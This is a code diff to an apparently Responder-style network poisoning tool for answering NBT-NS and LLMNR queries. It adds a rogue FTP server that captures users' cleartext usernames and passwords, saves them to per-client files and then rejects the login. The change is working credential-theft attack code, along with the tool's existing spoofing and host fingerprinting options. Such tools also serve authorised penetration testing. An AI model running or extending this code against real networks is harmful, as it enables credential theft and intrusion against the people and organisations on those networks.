@@ -43,6 +43,8 @@ parser.add_option('-l','--logfile', action="store", dest="sessionLog", help = "L
 
 parser.add_option('-f','--fingerprint', action="store", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", metavar="Off", choices=['On','Off'], default="Off")
 
+parser.add_option('-F','--ftp', action="store", dest="FTP_On_Off", help = "Set this to On or Off to start/stop the FTP server. Default value is On", metavar="On", choices=['On','Off'], default="On")
+
 
 options, args = parser.parse_args()
 
@@ -67,6 +69,7 @@ Basic = options.Basic
 On_Off = options.on_off.upper()
 SMB_On_Off = options.SMB_on_off.upper()
 SQL_On_Off = options.SQL_on_off.upper()
+FTP_On_Off = options.FTP_On_Off.upper()
 Finger_On_Off = options.Finger.upper()
 Wredirect = options.Wredirect
 NumChal = options.optChal
@@ -89,7 +92,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS & LLMNR answerer started\nGlobal Parameters set:\nChallenge set is: %s\nHTTP Server is:%s\nSMB Server is:%s\nSQL Server is:%s\nFingerPrint Module is:%s"%(NumChal,On_Off,SMB_On_Off,SQL_On_Off,Finger_On_Off))
+Show_Help("[+]NBT-NS & LLMNR answerer started\nGlobal Parameters set:\nChallenge set is: %s\nHTTP Server is:%s\nSMB Server is:%s\nSQL Server is:%s\nFTP Server is:%s\nFingerPrint Module is:%s"%(NumChal,On_Off,SMB_On_Off,SQL_On_Off,FTP_On_Off,Finger_On_Off))
 
 #Simple NBNS Services.
 W_REDIRECT   = "\x41\x41\x00"
@@ -204,7 +207,7 @@ def FindPDC(data,Client):
           logging.warning('[Browser]PDC Machine Name is: %s'%(ServerName))
     else:
        pass
-      
+
 class Browser(SocketServer.BaseRequestHandler):
     def server_bind(self):
        self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
@@ -717,6 +720,52 @@ class HTTP(SocketServer.BaseRequestHandler):
            self.request.close()
 
 ##################################################################################
+#FTP Stuff
+##################################################################################
+class FTPPacket(Packet):
+    fields = OrderedDict([
+        ("Code",           "220"),
+        ("Separator",      "\x20"),
+        ("Message",        "Welcome"),
+        ("Terminator",     "\x0d\x0a"),                     
+    ])
+
+#FTP server class.
+class FTP(SocketServer.BaseRequestHandler):
+    def server_bind(self):
+       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
+       self.socket.bind(self.server_address)
+       self.socket.setblocking(0)
+       self.socket.setdefaulttimeout(1)
+
+    def handle(self):
+        try:
+          self.request.send(str(FTPPacket()))
+          data = self.request.recv(1024)
+          if data[0:4] == "USER":
+             User = data[5:].replace("\r\n","")
+             print "[+]FTP User: ", User
+             logging.warning('[+]FTP User: %s'%(User))
+             t = FTPPacket(Code="331",Message="User name okay, need password.")
+             self.request.send(str(t))
+             data = self.request.recv(1024)
+          if data[0:4] == "PASS":
+             Pass = data[5:].replace("\r\n","")
+             Outfile = "FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
+             WriteData(Outfile,User+":"+Pass)
+             print "[+]FTP Password is: ", Pass
+             logging.warning('[+]FTP Password is: %s'%(Pass))
+             t = FTPPacket(Code="530",Message="User not logged in.")
+             self.request.send(str(t))
+             data = self.request.recv(1024)
+          else :
+             t = FTPPacket(Code="502",Message="Command not implemented.")
+             self.request.send(str(t))
+             data = self.request.recv(1024)
+        except Exception:
+           raise
+
+##################################################################################
 #Loading the servers
 ##################################################################################
 
@@ -742,6 +791,13 @@ def Is_SQL_On(SQL_On_Off):
     if SQL_On_Off == "OFF":
        return False
 
+#Function name self-explanatory
+def Is_FTP_On(FTP_On_Off):
+    if FTP_On_Off == "ON":
+       return thread.start_new(serve_thread_tcp,('', 21,FTP))
+    if FTP_On_Off == "OFF":
+       return False
+
 SocketServer.UDPServer.allow_reuse_address = 1
 SocketServer.TCPServer.allow_reuse_address = 1
 
@@ -762,6 +818,7 @@ def serve_thread_tcp(host, port, handler):
 
 def main():
     try:
+      Is_FTP_On(FTP_On_Off)
       Is_HTTP_On(On_Off)
       Is_SMB_On(SMB_On_Off)
       Is_SQL_On(SQL_On_Off)
